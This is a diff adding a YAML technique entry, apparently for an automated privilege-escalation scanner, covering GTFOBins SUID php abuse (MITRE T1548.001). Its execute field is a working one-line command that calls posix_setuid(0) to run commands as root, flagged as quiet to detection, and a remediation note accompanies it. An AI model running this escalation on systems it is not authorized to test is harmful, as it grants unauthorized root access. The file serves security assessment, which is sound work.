@@ -1,0 +1,25 @@
+# SUID php → root (GTFOBins)
+technique: T1548.001
+name: SUID php → root (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  suid: php
+execute:
+  command: "{{binary}} -r 'posix_setuid(0);system(\"id\");'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_suid
+  description: >
+    SUID PHP reasserts the SUID EUID via posix_setuid(0) and shells
+    out as root.
+  remediation: >
+    Remove the SUID bit from the php interpreter.
+  refs: [T1548.001, GTFOBins/php]
